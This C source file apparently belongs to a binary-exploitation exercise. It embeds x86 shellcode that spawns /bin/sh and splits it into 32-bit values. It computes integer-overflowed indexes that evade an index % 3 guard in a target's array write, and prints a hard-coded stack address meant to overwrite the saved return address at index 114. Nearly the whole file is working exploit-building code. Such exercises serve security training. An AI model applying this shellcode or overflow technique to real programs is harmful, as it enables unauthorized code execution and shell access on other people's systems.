#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

#define ARRAY_ADDR 0xFFFFD474

/*
** why / 4 ?
** because in case unsigned int [], it's equivalent to
** array[index * 4] = ...
** this is done in asm with:
** 0x080486c5 <+149>:	shl    $0x2,%eax
** so we divide by 4
*/

static unsigned int     get_index(const unsigned int index)
{
    if (index % 3 == 0)
        return (UINT32_MAX / 4 + index + 1);
    return (index);
}

/*
** if the endianess is a problem, use this.
*/

static unsigned int     endian_swap(const unsigned int x)
{
    return (
        ((x & 0xff000000) >> 24) |
        ((x & 0x00ff0000) >> 8) |
        ((x & 0x0000ff00) << 8) |
        ((x & 0x000000ff) << 24));
}

/*
** this code converts the shellcode into an array of int
** it's needed to inject shellcode into a unsigned int []
** we need to compute the overflowed indexes for all % 3 indexes,
** to do to we add UINT32_MAX / 4 + index + 1 to perform an overflow
*/

int     main(void)
{
    const unsigned int  len = 24 / 4;       // the amount of unsigned int
    const char          *code =
        "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
        "\x6e\x89\xe3\x31\xc9\xcd\x80\x90\x90";
    unsigned int        i;
    unsigned int        index;
    unsigned int        x;

    printf("u32 max: %u\n", UINT32_MAX);
    printf("%x\n%x\n", 0x12345678, endian_swap(0x12345678));
    puts("[idx] value        index        hex");
    index = 0;
    // we iterate over the shellcode unsigend int by unsigned int
    for (i = 0; i < len; i++)
    {
        x = ((unsigned int *)code)[i];
        printf("[%3u] %-12u %-12u %#x\n", index, x, get_index(index), x);
        index++;
    }
    printf("[eip] %-12u %-12u %#x\n", ARRAY_ADDR, get_index(114), ARRAY_ADDR);
    printf("[ -9] %u\n", -9);
    return (EXIT_SUCCESS);
}
